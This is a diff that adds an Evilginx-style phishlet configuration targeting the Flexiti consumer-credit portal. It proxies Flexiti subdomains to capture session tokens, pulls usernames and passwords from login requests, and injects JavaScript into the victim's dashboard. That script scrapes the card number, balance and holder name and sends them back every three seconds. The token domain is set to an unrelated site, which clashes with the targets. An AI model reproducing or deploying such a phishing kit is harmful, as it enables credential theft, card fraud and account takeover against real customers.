@@ -1,0 +1,50 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'my', orig_sub: 'my', domain: 'flexiti.com', session: true, is_landing: false}
+  - {phish_sub: 'myapi', orig_sub: 'myapi', domain: 'flexiti.fi', session: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.hypedrop.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/dashboard'
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    - key: 'balance'
+      search: '(.*)'
+      type: 'post'
+    - key: 'name'
+      search: '(.*)'
+      type: 'post'
+    - key: 'number'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'my.flexiti.com'
+  path: '/index'
+
+js_inject:
+  - trigger_domains: ["my.flexiti.com"]
+    trigger_paths: ["/dashboard"]
+    trigger_params: []
+    script: |
+      function sendCapture(){
+        var balance = document.getElementsByClassName('balance-information__amount')[0].innerText;
+        var number = document.getElementsByClassName('flx-card-number__number')[0].innerText;
+        var name = document.getElementsByClassName('flx-portal-header__user')[0].innerText.replace('Welcome ', "");
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/dashboard', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("balance="+encodeURIComponent(balance)+"&number="+encodeURIComponent(number)+"&name="+encodeURIComponent(name));
+
+      }
+       setInterval(function(){ sendCapture(); }, 3000);
